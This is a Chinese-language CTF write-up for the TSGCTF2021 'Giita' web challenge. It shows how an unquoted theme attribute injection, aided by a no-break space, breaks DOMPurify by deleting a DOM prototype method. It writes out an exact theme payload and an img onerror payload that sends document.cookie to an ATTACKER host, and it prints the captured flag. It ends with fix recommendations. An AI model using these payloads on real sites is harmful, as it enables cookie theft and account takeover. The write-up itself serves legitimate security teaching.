# TSGCTF2021 Giita WP

## 题目简述

Giita 允许用户创建文章并选择代码主题，随后把文章报告给携带 flag Cookie 的 Chrome crawler。正文在服务端先作为文本转义，客户端再执行：

```javascript
const body = document.getElementById('body');
body.innerHTML = DOMPurify.sanitize(body.textContent);
```

看似所有正文 HTML 都会经过 DOMPurify。漏洞在主题名：模板把主题路径放入未加引号的 `href` 属性，而校验只允许最多一个不属于 `\w`、空白或点号的字符。攻击者可用这一个字符插入 `onerror=`，再在 DOMPurify 执行前破坏它依赖的 DOM API。

## 解题过程

服务端输出主题时使用：

```html
<link rel="stylesheet" href=<%= it.theme %>>
```

提交下面的 `theme`：

```text
x onerror=delete document.implementation.__proto__.createHTMLDocument<SPACE>
```

其中 `<SPACE>` 表示末尾必须保留一个普通 ASCII 空格；后文 Python 字符串中的结尾空格是可直接提交的精确写法。

`delete` 与 `document` 之间是 U+00A0 NO-BREAK SPACE。JavaScript 把它当空白，校验正则 `\s` 也接受它；整个字符串中只有等号 `=` 属于“不合法字符”，正好没有超过一次限制。最终生成的标签近似为：

```html
<link rel="stylesheet"
      href=/public/themes/x
      onerror=delete document.implementation.__proto__.createHTMLDocument
      .css>
```

不存在的样式路径触发 `onerror`，删除 `DOMImplementation.prototype.createHTMLDocument`。页面 CSP 只设置了 `style-src`，没有设置 `script-src`，所以内联事件处理器仍可执行。

DOMPurify 的延迟脚本随后初始化时，发现关键 DOM 能力缺失，无法进入正常净化路径。文章正文使用：

```html
<img src="x" onerror="location.href='https://ATTACKER/report?' + document.cookie">
```

服务端模板把它转义为文本，但 `post.js` 读取 `body.textContent` 后再赋给 `innerHTML`。由于净化器已经被前面的原型修改破坏，危险的 `onerror` 被原样写回 DOM，图片加载失败时把 Cookie 发送到攻击者服务器。

完整提交参数的核心为：

```python
theme = "x onerror=delete\u00a0document.implementation.__proto__.createHTMLDocument "
body = f'<img src="x" onerror="location.href=\'{callback}?\' + document.cookie">'
```

创建文章后向该文章路径发送 POST 触发报告。crawler 设置的 Cookie 默认不是 HttpOnly，回调收到：

```text
cookie=TSGCTF{Qiita_Mita_Katta:_To_cheat_programmer_by_copying_sample_codes_from_Qiita}
```

## 方法总结

这题绕过的不是 DOMPurify 某条标签规则，而是先通过未加引号的属性注入修改其运行环境，再让原有可信脚本把攻击正文写入 `innerHTML`。关键组合是宽松文件名校验、Unicode 空白、缺失 `script-src`、可修改的 DOM 原型和 sanitizer 的能力检测。修复应为属性值做上下文正确的引号与转义，只允许预定义主题标识，并设置严格 CSP；flag Cookie 还应启用 HttpOnly，避免 DOM XSS 直接读取。
